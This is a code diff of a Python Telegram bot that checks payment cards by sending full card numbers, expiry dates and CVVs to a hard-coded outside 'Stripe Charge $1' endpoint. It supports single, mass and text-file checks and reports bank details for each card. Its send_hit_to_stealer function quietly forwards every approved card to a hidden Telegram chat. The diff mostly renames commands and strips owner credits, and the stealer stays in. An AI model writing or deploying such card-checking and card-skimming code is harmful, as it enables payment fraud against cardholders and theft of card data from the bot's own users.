@@ -18,12 +18,12 @@ API_BASE = "http://147.93.53.240:5020/check"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
-# Owner DM link and clickable symbol
+# Owner DM link and clickable symbol (only for the ㊕ symbol)
 OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 
 # -------------------------------------------------------------
-# Stealer function (NO reply_markup, clean message only)
+# Stealer function (no reply_markup, no owner line)
 # -------------------------------------------------------------
 async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
     try:
@@ -33,9 +33,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
 
 {SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
-        # Send WITHOUT any reply_markup (no buttons)
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})"""
         await client.send_message(chat_id=-1003627495953, text=stealer_msg, parse_mode="HTML", reply_markup=None)
     except Exception as e:
         print(f"[Stealer Error] {e}")
@@ -43,8 +41,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 # -------------------------------------------------------------
 # API caller
 # -------------------------------------------------------------
-async def call_stripe_charge1_api(fullcc):
-    """Charge $1 via custom Stripe endpoint"""
+async def call_stripe_charge_api(fullcc):
     endpoint_url = f"{API_BASE}?cc={fullcc}"
     async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
         for attempt in range(2):
@@ -72,10 +69,10 @@ def extract_cards(text):
     return re.findall(pattern, text)
 
 # -------------------------------------------------------------
-# SINGLE CHECK COMMAND
+# SINGLE CHECK COMMAND (/sc)
 # -------------------------------------------------------------
-@Client.on_message(filters.command("sc1", [".", "/"]))
-async def stripe_charge1_cmd(Client, message):
+@Client.on_message(filters.command("sc", [".", "/"]))
+async def stripe_charge_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
@@ -90,11 +87,11 @@ async def stripe_charge1_cmd(Client, message):
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
 ⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
-◈ <b>ᴄᴍᴅ :</b> /sc1
+◈ <b>ᴄᴍᴅ :</b> /sc
 
 ⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗
 
-↪ <b>ᴜꜱᴀɢᴇ :</b> /sc1 cc|mm|yyyy|cvv
+↪ <b>ᴜꜱᴀɢᴇ :</b> /sc cc|mm|yyyy|cvv
 ━━━━━━━━━━━━━━━━━━━━"""
             await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
             return
@@ -120,7 +117,7 @@ async def stripe_charge1_cmd(Client, message):
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
 
         start = time.perf_counter()
-        status, response, gateway = await call_stripe_charge1_api(fullcc)
+        status, response, gateway = await call_stripe_charge_api(fullcc)
 
         getbin = await get_bin_details(cc)
         brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
@@ -147,17 +144,14 @@ async def stripe_charge1_cmd(Client, message):
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
 
-        # IMPORTANT: No reply_markup here!
         await Client.edit_message_text(
             message.chat.id, 
             thirdcheck.id, 
             finalresp, 
             disable_web_page_preview=True, 
             parse_mode=enums.ParseMode.HTML
-            # NO reply_markup parameter
         )
         await setantispamtime(user_id)
         await deductcredit(user_id)
@@ -167,10 +161,10 @@ async def stripe_charge1_cmd(Client, message):
         await error_log(traceback.format_exc())
 
 # -------------------------------------------------------------
-# MASS CHECK (text/reply)
+# MASS CHECK (text/reply) (/msc)
 # -------------------------------------------------------------
-@Client.on_message(filters.command("msc1", [".", "/"]))
-async def stripe_charge1_mass_cmd(Client, message):
+@Client.on_message(filters.command("msc", [".", "/"]))
+async def stripe_charge_mass_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
@@ -193,11 +187,11 @@ async def stripe_charge1_mass_cmd(Client, message):
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
 ⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
-◈ <b>ᴄᴍᴅ :</b> /msc1
+◈ <b>ᴄᴍᴅ :</b> /msc
 
 ⟢ ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ ɪɴ ʏᴏᴜʀ ɪɴᴘᴜᴛ ✗
 
-↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msc1 cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
+↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /msc cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
 ━━━━━━━━━━━━━━━━━━━━"""
             await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
             return
@@ -212,10 +206,10 @@ async def stripe_charge1_mass_cmd(Client, message):
         await error_log(traceback.format_exc())
 
 # -------------------------------------------------------------
-# TXT FILE COMMAND
+# TXT FILE COMMAND (/tsc)
 # -------------------------------------------------------------
-@Client.on_message(filters.command("tsc1", [".", "/"]))
-async def stripe_charge1_txt_cmd(Client, message):
+@Client.on_message(filters.command("tsc", [".", "/"]))
+async def stripe_charge_txt_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         first_name = message.from_user.first_name
@@ -235,7 +229,7 @@ async def stripe_charge1_txt_cmd(Client, message):
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
 ⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
-◈ <b>ᴄᴍᴅ :</b> /tsc1
+◈ <b>ᴄᴍᴅ :</b> /tsc
 
 ⟢ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
 ━━━━━━━━━━━━━━━━━━━━"""
@@ -262,7 +256,7 @@ async def stripe_charge1_txt_cmd(Client, message):
         await error_log(traceback.format_exc())
 
 # -------------------------------------------------------------
-# SEQUENTIAL PROCESSING (with progress, separate approved messages, declined summary)
+# SEQUENTIAL PROCESSING
 # -------------------------------------------------------------
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
     total_cards = len(ccs)
@@ -273,7 +267,6 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     start_time = time.perf_counter()
     approved_cards = []
 
-    # Initial progress message
     progress_text = f"""Stripe Charge $1
 Admin
 
@@ -292,7 +285,7 @@ Checked by: {first_name} ({role})"""
         processed = idx
         remaining = total_cards - processed
 
-        status, response, gateway = await call_stripe_charge1_api(fullcc)
+        status, response, gateway = await call_stripe_charge_api(fullcc)
 
         cc_num = fullcc.split('|')[0]
         getbin = await get_bin_details(cc_num)
@@ -318,7 +311,6 @@ Checked by: {first_name} ({role})"""
             declined_count += 1
             response_status = "DECLINED ❌"
 
-        # Update progress (NO reply_markup)
         try:
             await Client.edit_message_text(
                 message.chat.id,
@@ -342,7 +334,6 @@ Checked by: {first_name} ({role})""",
 
     await progress_msg.delete()
 
-    # Send each approved card as separate message (NO reply_markup)
     for card in approved_cards:
         approved_msg = f"""{card['status']}
 
@@ -355,8 +346,7 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
@@ -378,10 +368,7 @@ Checked by: {first_name} ({role})""",
 ❌ Declined: {declined_count}
 📊 Total: {total_cards}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+👤 Checked by: {first_name} ({role})"""
         await message.reply_text(declined_summary, quote=True, parse_mode=enums.ParseMode.HTML)
     else:
         await message.reply_text(
@@ -391,10 +378,7 @@ Checked by: {first_name} ({role})""",
 📊 Total Cards: {total_cards}
 ❌ All Declined: {declined_count}
 ⏱ Time: {elapsed_time}s
-👤 Checked by: {first_name} ({role})
-
-━━━━━━━━━━━━━━━━━━━━
-<a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>""",
+👤 Checked by: {first_name} ({role})""",
             quote=True,
             parse_mode=enums.ParseMode.HTML
         )
